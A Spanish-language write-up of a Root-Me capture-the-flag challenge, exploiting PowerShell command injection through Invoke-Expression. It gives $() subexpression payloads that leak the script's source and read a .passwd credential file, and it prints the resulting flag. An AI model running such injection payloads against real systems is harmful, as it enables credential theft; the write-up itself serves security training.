Root-Me: PowerShell Command Injection (App-Script)
🎯 Objetivo
El objetivo de este reto es obtener la contraseña de una base de datos interactuando con un script de PowerShell que presenta vulnerabilidades en el manejo de entradas del usuario.

🔍 Metodología
0. Identificación de la vulnerabilidad
Al ingresar un carácter especial como la comilla doble ("), el script arroja un error de sintaxis:

PowerShell

> "
iex : At line:1 char:441
+ ... Backup the table "
+                      ~
The string is missing the terminator: ".
Análisis: El uso de Invoke-Expression (iex) para imprimir el mensaje indica que nuestra entrada se concatena directamente en una cadena de ejecución, permitiendo romper el flujo del programa.

1. Enumeración y Lectura del Código Fuente
Aprovechando la interpolación de comandos de PowerShell con $(), inyectamos un comando para leer el propio script del reto y entender su lógica interna:

Payload: $(Get-Content C:\cygwin64\challenge\app-script\ch18\ch18.ps1)

PowerShell

# Fragmento del código filtrado:
$key = Get-Content .key 
$SecurePassword = Get-Content .passwd | ... 
iex "Write-Host ... Backup the table $table"
Hallazgo: El script lee una contraseña de un archivo llamado .passwd y una llave de .key. El comando vulnerable es la última línea donde $table (nuestra entrada) se ejecuta dentro de un iex.

2. Explotación y Exfiltración (Flag)
Sabiendo que el archivo .passwd existe en el directorio actual, inyectamos el comando para volcar su contenido directamente en el mensaje de salida.

Payload final: $(Get-Content .passwd)

PowerShell

Connect to the database With the secure Password: [...] Backup the table SecureIEXpassword
Flag: SecureIEXpassword

💡 Conceptos Clave
IEX (Invoke-Expression): Una función peligrosa que ejecuta cualquier string como código.

Interpolación: En PowerShell, las cadenas dentro de $() se ejecutan antes que el comando principal.

Constrained Language Mode: Una protección que limitó el uso de clases .NET, obligándonos a leer archivos directamente.
